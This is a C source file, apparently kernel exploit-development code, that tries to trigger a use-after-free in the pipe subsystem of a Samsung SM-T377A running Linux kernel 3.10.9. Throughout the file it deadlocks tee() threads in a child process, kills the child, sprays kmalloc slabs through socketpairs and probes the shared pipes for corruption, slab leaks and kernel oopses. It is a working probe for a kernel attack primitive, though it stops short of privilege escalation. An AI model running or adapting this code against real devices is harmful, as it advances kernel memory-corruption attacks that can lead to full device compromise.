/*
 * pipe_uaf_exploit.c — Shared pipe ABBA deadlock UAF attempt
 *
 * THEORY OF EXPLOITATION:
 *   1. Parent creates pipes, forks child
 *   2. Child creates ABBA tee deadlock (threads hold pipe mutexes in opposite order)
 *   3. Parent SIGKILLs child
 *   4. Kernel must clean up child's deadlocked threads while parent still holds pipe fds
 *   5. If cleanup frees internal pipe state (pipe_buffer, pages) without properly
 *      invalidating parent's references → UAF
 *   6. Parent sprays kmalloc-64/128 with controlled data (socketpair)
 *   7. Parent reads from pipe → if we see spray data, that's UAF confirmed
 *
 * ADDITIONAL TESTS:
 *   - Test pipe write after child deadlock cleanup (corrupt mutex state?)
 *   - Test tee() from parent after child cleanup (stale pipe_buffer.ops?)
 *   - Test splice() from parent after child cleanup
 *   - Mass iterations to detect subtle corruption via checksums
 *
 * Build: arm-linux-gnueabi-gcc -static -pie -fPIE -o pipe_uaf_exploit pipe_uaf_exploit.c -lpthread
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <unistd.h>
#include <time.h>

#ifndef __NR_tee
#define __NR_tee 342
#endif
#ifndef __NR_splice
#define __NR_splice 340
#endif

#define MAGIC_PATTERN 0xDEADBEEF
#define SPRAY_COUNT 200

static int get_slab(const char *name) {
    FILE *f = fopen("/proc/slabinfo", "r");
    if (!f) return -1;
    char line[512]; int val = -1;
    while (fgets(line, sizeof(line), f)) {
        char n[64]; int a;
        if (sscanf(line, "%63s %d", n, &a) == 2 && !strcmp(n, name))
            { val = a; break; }
    }
    fclose(f);
    return val;
}

/* ========== Child: create ABBA deadlock ========== */

static int *shared_p1;  /* Pipe 1: p1[0]=read, p1[1]=write */
static int *shared_p2;  /* Pipe 2: p2[0]=read, p2[1]=write */
static volatile int child_ready = 0;

static void *child_tee_fwd(void *arg) {
    /* tee p1→p2: locks p1 mutex then p2 mutex */
    for (;;) {
        syscall(__NR_tee, shared_p1[0], shared_p2[1], 4096, 0);
    }
    return NULL;
}

static void *child_tee_bwd(void *arg) {
    /* tee p2→p1: locks p2 mutex then p1 mutex — ABBA! */
    for (;;) {
        syscall(__NR_tee, shared_p2[0], shared_p1[1], 4096, 0);
    }
    return NULL;
}

static void child_create_deadlock(int p1[2], int p2[2]) {
    shared_p1 = p1;
    shared_p2 = p2;

    /* Put data in both pipes so tee has something to work with */
    char data[2048];
    memset(data, 'A', sizeof(data));
    write(p1[1], data, sizeof(data));
    memset(data, 'B', sizeof(data));
    write(p2[1], data, sizeof(data));

    /* Set small pipe sizes to fill quickly */
    fcntl(p1[0], 1031 /* F_SETPIPE_SZ */, 4096);
    fcntl(p2[0], 1031 /* F_SETPIPE_SZ */, 4096);

    /* Blocking mode */
    fcntl(p1[0], F_SETFL, 0);
    fcntl(p1[1], F_SETFL, 0);
    fcntl(p2[0], F_SETFL, 0);
    fcntl(p2[1], F_SETFL, 0);

    pthread_t t1, t2;
    pthread_create(&t1, NULL, child_tee_fwd, NULL);
    pthread_create(&t2, NULL, child_tee_bwd, NULL);

    /* Signal parent we're running */
    /* (pipe to parent for synchronization) */

    /* Block forever — parent will SIGKILL us */
    while (1) pause();
}

/* ========== Spray helpers ========== */

static int spray_fds[SPRAY_COUNT * 2];
static int spray_count = 0;

static void spray_k64(int count) {
    /* socketpair spray: ~5.2 kmalloc-64 objects per pair */
    for (int i = 0; i < count && spray_count < SPRAY_COUNT; i++) {
        int sv[2];
        if (socketpair(AF_UNIX, SOCK_STREAM, 0, sv) == 0) {
            /* Write controlled pattern to socket buffer */
            uint32_t pattern = MAGIC_PATTERN;
            write(sv[0], &pattern, sizeof(pattern));
            spray_fds[spray_count * 2] = sv[0];
            spray_fds[spray_count * 2 + 1] = sv[1];
            spray_count++;
        }
    }
}

static void cleanup_spray(void) {
    for (int i = 0; i < spray_count; i++) {
        close(spray_fds[i * 2]);
        close(spray_fds[i * 2 + 1]);
    }
    spray_count = 0;
}

/* ========== TEST 1: Shared pipe read after ABBA SIGKILL ========== */

static void test_shared_pipe_read(void) {
    printf("=== TEST 1: Read shared pipe after ABBA deadlock SIGKILL ===\n");

    int p1[2], p2[2];
    pipe(p1); pipe(p2);

    /* Write known pattern before fork */
    char known_data[64];
    memset(known_data, 'K', sizeof(known_data));
    write(p1[1], known_data, sizeof(known_data));
    write(p2[1], known_data, sizeof(known_data));

    int anomalies = 0;
    int iters = 50;

    for (int i = 0; i < iters; i++) {
        int pp1[2], pp2[2];
        pipe(pp1); pipe(pp2);

        /* Write known pattern */
        char wr[64];
        memset(wr, 'P' + (i % 26), sizeof(wr));
        write(pp1[1], wr, sizeof(wr));
        write(pp2[1], wr, sizeof(wr));

        pid_t pid = fork();
        if (pid == 0) {
            child_create_deadlock(pp1, pp2);
            _exit(0);
        }

        /* Give child time to create threads and enter deadlock */
        usleep(150000);

        /* SIGKILL the deadlocked child */
        kill(pid, SIGKILL);
        int status;
        waitpid(pid, &status, 0);

        /* Immediate spray into freed slabs */
        spray_k64(100);

        /* Try to read from the pipe — does the data match? */
        fcntl(pp1[0], F_SETFL, O_NONBLOCK);
        fcntl(pp2[0], F_SETFL, O_NONBLOCK);

        char rd1[256], rd2[256];
        memset(rd1, 0, sizeof(rd1));
        memset(rd2, 0, sizeof(rd2));

        int n1 = read(pp1[0], rd1, sizeof(rd1));
        int n2 = read(pp2[0], rd2, sizeof(rd2));

        /* Check if data is corrupted (not our known pattern) */
        int corrupt = 0;
        if (n1 > 0) {
            for (int j = 0; j < n1; j++) {
                if (rd1[j] != wr[0] && rd1[j] != 'A') {
                    corrupt = 1;
                    printf("  [%d] PIPE1 CORRUPTION at byte %d: expected 0x%02x got 0x%02x\n",
                           i, j, (unsigned char)wr[0], (unsigned char)rd1[j]);
                    break;
                }
            }
        }
        if (n2 > 0) {
            for (int j = 0; j < n2; j++) {
                if (rd2[j] != wr[0] && rd2[j] != 'B') {
                    corrupt = 1;
                    printf("  [%d] PIPE2 CORRUPTION at byte %d: expected 0x%02x got 0x%02x\n",
                           i, j, (unsigned char)wr[0], (unsigned char)rd2[j]);
                    break;
                }
            }
        }

        /* Check for MAGIC_PATTERN from spray */
        if (n1 >= 4) {
            uint32_t *p = (uint32_t *)rd1;
            for (int j = 0; j < n1/4; j++) {
                if (p[j] == MAGIC_PATTERN) {
                    printf("  [%d] *** UAF DETECTED! MAGIC_PATTERN in pipe1 read! ***\n", i);
                    corrupt = 1;
                }
            }
        }
        if (n2 >= 4) {
            uint32_t *p = (uint32_t *)rd2;
            for (int j = 0; j < n2/4; j++) {
                if (p[j] == MAGIC_PATTERN) {
                    printf("  [%d] *** UAF DETECTED! MAGIC_PATTERN in pipe2 read! ***\n", i);
                    corrupt = 1;
                }
            }
        }

        if (corrupt) anomalies++;

        if (n1 < 0 && errno != EAGAIN) {
            printf("  [%d] pipe1 read error: %s (errno=%d)\n", i, strerror(errno), errno);
            anomalies++;
        }
        if (n2 < 0 && errno != EAGAIN) {
            printf("  [%d] pipe2 read error: %s (errno=%d)\n", i, strerror(errno), errno);
            anomalies++;
        }

        cleanup_spray();
        close(pp1[0]); close(pp1[1]);
        close(pp2[0]); close(pp2[1]);

        if ((i + 1) % 10 == 0) {
            printf("  [%d/%d] anomalies=%d\n", i + 1, iters, anomalies);
            fflush(stdout);
        }
    }

    close(p1[0]); close(p1[1]);
    close(p2[0]); close(p2[1]);

    printf("  Result: %d anomalies in %d iterations\n\n", anomalies, iters);
}

/* ========== TEST 2: tee() from parent after child ABBA SIGKILL ========== */

static void test_parent_tee_after_kill(void) {
    printf("=== TEST 2: Parent tee() after child ABBA deadlock SIGKILL ===\n");

    int anomalies = 0;
    int iters = 50;

    for (int i = 0; i < iters; i++) {
        int pp1[2], pp2[2], pp3[2];
        pipe(pp1); pipe(pp2); pipe(pp3);

        char wr[64];
        memset(wr, 'T', sizeof(wr));
        write(pp1[1], wr, sizeof(wr));
        write(pp2[1], wr, sizeof(wr));

        pid_t pid = fork();
        if (pid == 0) {
            close(pp3[0]); close(pp3[1]);
            child_create_deadlock(pp1, pp2);
            _exit(0);
        }

        usleep(150000);
        kill(pid, SIGKILL);
        int status;
        waitpid(pid, &status, 0);

        /* Parent tries tee on the pipes that were involved in child's deadlock */
        fcntl(pp1[0], F_SETFL, O_NONBLOCK);
        fcntl(pp3[1], F_SETFL, O_NONBLOCK);

        errno = 0;
        long ret = syscall(__NR_tee, pp1[0], pp3[1], 4096, 1 /* SPLICE_F_NONBLOCK */);
        if (ret < 0 && errno != EAGAIN) {
            printf("  [%d] parent tee error: %s (errno=%d)\n", i, strerror(errno), errno);
            anomalies++;
        } else if (ret > 0) {
            /* Read from pp3 and verify data integrity */
            char rd[256];
            int n = read(pp3[0], rd, sizeof(rd));
            if (n > 0) {
                for (int j = 0; j < n; j++) {
                    if (rd[j] != 'T' && rd[j] != 'A') {
                        printf("  [%d] TEE DATA CORRUPTION at byte %d: 0x%02x\n",
                               i, j, (unsigned char)rd[j]);
                        anomalies++;
                        break;
                    }
                }
            }
        }

        close(pp1[0]); close(pp1[1]);
        close(pp2[0]); close(pp2[1]);
        close(pp3[0]); close(pp3[1]);
    }

    printf("  Result: %d anomalies in %d iterations\n\n", anomalies, iters);
}

/* ========== TEST 3: splice() from parent after child deadlock SIGKILL ========== */

static void test_parent_splice_after_kill(void) {
    printf("=== TEST 3: Parent splice() after child ABBA deadlock SIGKILL ===\n");

    int anomalies = 0;
    int iters = 50;

    for (int i = 0; i < iters; i++) {
        int pp1[2], pp2[2], pp3[2];
        pipe(pp1); pipe(pp2); pipe(pp3);

        char wr[64];
        memset(wr, 'S', sizeof(wr));
        write(pp1[1], wr, sizeof(wr));
        write(pp2[1], wr, sizeof(wr));

        pid_t pid = fork();
        if (pid == 0) {
            close(pp3[0]); close(pp3[1]);
            child_create_deadlock(pp1, pp2);
            _exit(0);
        }

        usleep(150000);
        kill(pid, SIGKILL);
        int status;
        waitpid(pid, &status, 0);

        /* Parent tries splice — this MOVES data unlike tee */
        fcntl(pp1[0], F_SETFL, O_NONBLOCK);
        fcntl(pp3[1], F_SETFL, O_NONBLOCK);

        errno = 0;
        loff_t off = 0;
        long ret = syscall(__NR_splice, pp1[0], NULL, pp3[1], NULL,
                          4096, 1 /* SPLICE_F_NONBLOCK */);
        if (ret < 0 && errno != EAGAIN) {
            printf("  [%d] parent splice error: %s (errno=%d)\n", i, strerror(errno), errno);
            anomalies++;
        } else if (ret > 0) {
            char rd[256];
            int n = read(pp3[0], rd, sizeof(rd));
            if (n > 0) {
                for (int j = 0; j < n; j++) {
                    if (rd[j] != 'S' && rd[j] != 'A') {
                        printf("  [%d] SPLICE DATA CORRUPTION at byte %d: 0x%02x\n",
                               i, j, (unsigned char)rd[j]);
                        anomalies++;
                        break;
                    }
                }
            }
        }

        close(pp1[0]); close(pp1[1]);
        close(pp2[0]); close(pp2[1]);
        close(pp3[0]); close(pp3[1]);
    }

    printf("  Result: %d anomalies in %d iterations\n\n", anomalies, iters);
}

/* ========== TEST 4: Tight race — concurrent parent splice + child deadlock ========== */

struct race_args {
    int p1[2], p2[2], p3[2];
    volatile int stop;
};

static void *race_splice_thread(void *arg) {
    struct race_args *r = (struct race_args *)arg;
    char buf[256];
    while (!r->stop) {
        fcntl(r->p1[0], F_SETFL, O_NONBLOCK);
        fcntl(r->p3[1], F_SETFL, O_NONBLOCK);
        long ret = syscall(__NR_splice, r->p1[0], NULL, r->p3[1], NULL,
                          64, 1 /* SPLICE_F_NONBLOCK */);
        if (ret > 0) {
            int n = read(r->p3[0], buf, sizeof(buf));
            /* Check for corruption */
            if (n > 0) {
                for (int j = 0; j < n; j++) {
                    if ((unsigned char)buf[j] > 0x7f) {
                        printf("  *** RACE CORRUPTION: byte %d = 0x%02x ***\n",
                               j, (unsigned char)buf[j]);
                        r->stop = 1;
                        return (void *)1;
                    }
                }
            }
        }
        usleep(100);
    }
    return NULL;
}

static void test_concurrent_splice_deadlock(void) {
    printf("=== TEST 4: Concurrent parent splice during child deadlock creation ===\n");

    int anomalies = 0;
    int iters = 30;

    for (int i = 0; i < iters; i++) {
        struct race_args ra;
        pipe(ra.p1); pipe(ra.p2); pipe(ra.p3);
        ra.stop = 0;

        char wr[256];
        memset(wr, 'R', sizeof(wr));
        write(ra.p1[1], wr, sizeof(wr));
        write(ra.p2[1], wr, sizeof(wr));

        /* Start parent splice thread BEFORE forking child */
        pthread_t splicer;
        pthread_create(&splicer, NULL, race_splice_thread, &ra);

        pid_t pid = fork();
        if (pid == 0) {
            child_create_deadlock(ra.p1, ra.p2);
            _exit(0);
        }

        /* Let race run */
        usleep(200000);

        kill(pid, SIGKILL);
        int status;
        waitpid(pid, &status, 0);

        /* Continue splicing after child death */
        write(ra.p1[1], wr, 64);
        usleep(100000);

        ra.stop = 1;
        void *ret;
        pthread_join(splicer, &ret);

        if (ret == (void *)1) {
            printf("  [%d] CORRUPTION DETECTED during concurrent splice!\n", i);
            anomalies++;
        }

        close(ra.p1[0]); close(ra.p1[1]);
        close(ra.p2[0]); close(ra.p2[1]);
        close(ra.p3[0]); close(ra.p3[1]);
    }

    printf("  Result: %d anomalies in %d iterations\n\n", anomalies, iters);
}

/* ========== TEST 5: Write to pipe after child deadlock + slab monitor ========== */

static void test_write_after_kill_slab(void) {
    printf("=== TEST 5: Pipe write after ABBA SIGKILL + slab monitoring ===\n");

    int total_k64 = 0, total_k128 = 0;
    int anomalies = 0;
    int iters = 50;

    for (int i = 0; i < iters; i++) {
        int pp1[2], pp2[2];
        pipe(pp1); pipe(pp2);

        char wr[64];
        memset(wr, 'W', sizeof(wr));
        write(pp1[1], wr, sizeof(wr));
        write(pp2[1], wr, sizeof(wr));

        int k64_before = get_slab("kmalloc-64");
        int k128_before = get_slab("kmalloc-128");

        pid_t pid = fork();
        if (pid == 0) {
            child_create_deadlock(pp1, pp2);
            _exit(0);
        }

        usleep(150000);
        kill(pid, SIGKILL);
        int status;
        waitpid(pid, &status, 0);

        /* Immediately write MORE data into the pipes */
        fcntl(pp1[1], F_SETFL, O_NONBLOCK);
        fcntl(pp2[1], F_SETFL, O_NONBLOCK);

        char wr2[256];
        memset(wr2, 'Z', sizeof(wr2));
        int w1 = write(pp1[1], wr2, sizeof(wr2));
        int w2 = write(pp2[1], wr2, sizeof(wr2));

        /* Read back and check for corruption */
        fcntl(pp1[0], F_SETFL, O_NONBLOCK);
        fcntl(pp2[0], F_SETFL, O_NONBLOCK);

        char rd[512];
        int n = read(pp1[0], rd, sizeof(rd));
        if (n > 0) {
            for (int j = 0; j < n; j++) {
                if (rd[j] != 'W' && rd[j] != 'A' && rd[j] != 'Z') {
                    printf("  [%d] WRITE-AFTER-KILL CORRUPTION at byte %d: 0x%02x\n",
                           i, j, (unsigned char)rd[j]);
                    anomalies++;
                    break;
                }
            }
        }

        int k64_after = get_slab("kmalloc-64");
        int k128_after = get_slab("kmalloc-128");
        int d64 = k64_after - k64_before;
        int d128 = k128_after - k128_before;
        total_k64 += d64;
        total_k128 += d128;

        if (d64 > 10 || d64 < -10 || d128 > 5 || d128 < -5) {
            printf("  [%d] SLAB ANOMALY: k64=%+d k128=%+d\n", i, d64, d128);
            anomalies++;
        }

        close(pp1[0]); close(pp1[1]);
        close(pp2[0]); close(pp2[1]);
    }

    printf("  Cumulative slab: k64=%+d k128=%+d\n", total_k64, total_k128);
    printf("  Result: %d anomalies in %d iterations\n\n", anomalies, iters);
}

/* ========== TEST 6: Rapid fork-deadlock-kill with no pipe close (leak amplifier) ========== */

static void test_leak_amplifier(void) {
    printf("=== TEST 6: Rapid deadlock-kill cycles (leak amplifier) ===\n");

    int k64_start = get_slab("kmalloc-64");
    int k128_start = get_slab("kmalloc-128");
    int k192_start = get_slab("kmalloc-192");

    int iters = 200;
    int open_pipes[200][4]; /* Keep pipes open to prevent cleanup */
    int pipe_count = 0;

    for (int i = 0; i < iters; i++) {
        int pp1[2], pp2[2];
        if (pipe(pp1) < 0 || pipe(pp2) < 0) {
            printf("  [%d] pipe() failed: %s — stopping\n", i, strerror(errno));
            break;
        }

        char wr[32];
        memset(wr, 'L', sizeof(wr));
        write(pp1[1], wr, sizeof(wr));
        write(pp2[1], wr, sizeof(wr));

        pid_t pid = fork();
        if (pid == 0) {
            child_create_deadlock(pp1, pp2);
            _exit(0);
        }

        usleep(80000);  /* 80ms — enough for deadlock */
        kill(pid, SIGKILL);
        int status;
        waitpid(pid, &status, 0);

        /* Keep pipes open! If kernel leaked internal state, it won't be reclaimed */
        if (pipe_count < 200) {
            open_pipes[pipe_count][0] = pp1[0];
            open_pipes[pipe_count][1] = pp1[1];
            open_pipes[pipe_count][2] = pp2[0];
            open_pipes[pipe_count][3] = pp2[1];
            pipe_count++;
        }

        if ((i + 1) % 50 == 0) {
            int k64_now = get_slab("kmalloc-64");
            int k128_now = get_slab("kmalloc-128");
            int k192_now = get_slab("kmalloc-192");
            printf("  [%d/%d] k64=%+d k128=%+d k192=%+d (from start)\n",
                   i + 1, iters, k64_now - k64_start, k128_now - k128_start,
                   k192_now - k192_start);
            fflush(stdout);
        }
    }

    int k64_end = get_slab("kmalloc-64");
    int k128_end = get_slab("kmalloc-128");
    int k192_end = get_slab("kmalloc-192");

    printf("\n  After %d deadlock-kill cycles (pipes still open):\n", iters);
    printf("    kmalloc-64:  %+d\n", k64_end - k64_start);
    printf("    kmalloc-128: %+d\n", k128_end - k128_start);
    printf("    kmalloc-192: %+d\n", k192_end - k192_start);

    /* Now close all pipes */
    for (int i = 0; i < pipe_count; i++) {
        close(open_pipes[i][0]);
        close(open_pipes[i][1]);
        close(open_pipes[i][2]);
        close(open_pipes[i][3]);
    }

    usleep(100000);
    int k64_final = get_slab("kmalloc-64");
    int k128_final = get_slab("kmalloc-128");
    int k192_final = get_slab("kmalloc-192");

    printf("  After closing all pipes:\n");
    printf("    kmalloc-64:  %+d (leaked=%d)\n", k64_final - k64_start,
           k64_final - k64_start);
    printf("    kmalloc-128: %+d (leaked=%d)\n", k128_final - k128_start,
           k128_final - k128_start);
    printf("    kmalloc-192: %+d (leaked=%d)\n", k192_final - k192_start,
           k192_final - k192_start);

    if (k64_final - k64_start > 50 || k128_final - k128_start > 50) {
        printf("\n  *** CONFIRMED SLAB LEAK after cleanup! ***\n");
        printf("  *** Objects leaked = not freed when pipes closed ***\n");
        printf("  *** This is a kernel memory leak / potential UAF primitive! ***\n");
    }

    printf("\n");
}

int main(void) {
    printf("=== Shared Pipe ABBA Deadlock UAF Research ===\n");
    printf("SM-T377A kernel 3.10.9\n");
    printf("PID=%d UID=%d\n\n", getpid(), getuid());

    /* Raise fd limit for spray */
    alarm(600);  /* 10 min safety timeout */

    test_shared_pipe_read();
    test_parent_tee_after_kill();
    test_parent_splice_after_kill();
    test_concurrent_splice_deadlock();
    test_write_after_kill_slab();
    test_leak_amplifier();

    /* Final dmesg check */
    printf("--- dmesg ---\n");
    fflush(stdout);
    system("dmesg 2>/dev/null | tail -30 | grep -iE "
           "'oops|bug|panic|fault|corrupt|Backtrace|Unable|"
           "WARNING|pipe|splice|tee|slab|list_del|use.after' "
           "2>/dev/null");

    printf("\n=== Done ===\n");
    return 0;
}
